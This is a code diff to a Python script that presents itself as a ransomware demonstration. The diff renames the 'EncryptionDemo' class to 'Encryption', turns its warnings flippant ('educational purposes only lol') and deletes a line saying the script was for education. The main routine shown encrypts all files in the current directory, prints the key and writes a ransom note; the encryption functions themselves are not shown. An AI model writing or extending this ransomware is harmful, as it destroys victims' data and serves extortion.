@@ -11,7 +11,7 @@ logging.basicConfig(
     filename='encryption_demo.log'
 )
 
-class EncryptionDemo:
+class Encryption:
     def __init__(self):
         self.system = platform.system()
         self.script_name = os.path.basename(__file__)
@@ -150,12 +150,12 @@ WARNING: This is a demonstration. Do not pay any ransom.
             return False
 
 def main():
-    print("WARNING: This is a demonstration of ransomware concepts.")
+    print("WARNING: This isnt fully tested ran in sandboxed environment .")
     print("Do not run this on any system with important files.")
-    print("This code is for educational purposes only.")
+    print("This code is for educational purposes only lol..")
     
-    # Create demo instance
-    demo = EncryptionDemo()
+    # Create enc instance
+    enc = Encryption()
     
     # Get user confirmation
     confirm = input("Do you want to proceed with the demonstration? (yes/no): ")
@@ -164,23 +164,23 @@ def main():
         return
     
     try:
-        # Use current directory for demo
+        # Use current directory for enc
         target_dir = os.getcwd()
         
         # Generate key
-        key = demo.generate_key()
+        key = enc.generate_key()
         print(f"Generated key: {key.decode()}")
         
         # Encrypt files
-        encrypted_count = demo.encrypt_directory(target_dir, key)
+        encrypted_count = enc.encrypt_directory(target_dir, key)
         print(f"Encrypted {encrypted_count} files")
         
         # Create ransom note
-        if demo.create_ransom_note(target_dir, key):
+        if enc.create_ransom_note(target_dir, key):
             print("Ransom note created successfully")
         
         print("\nSimulation complete. Again, DO NOT USE THIS MALICIOUSLY.")
-        print("This demonstration was for educational purposes only.")
+        
         
     except Exception as e:
         logging.error(f"Error in main execution: {e}")
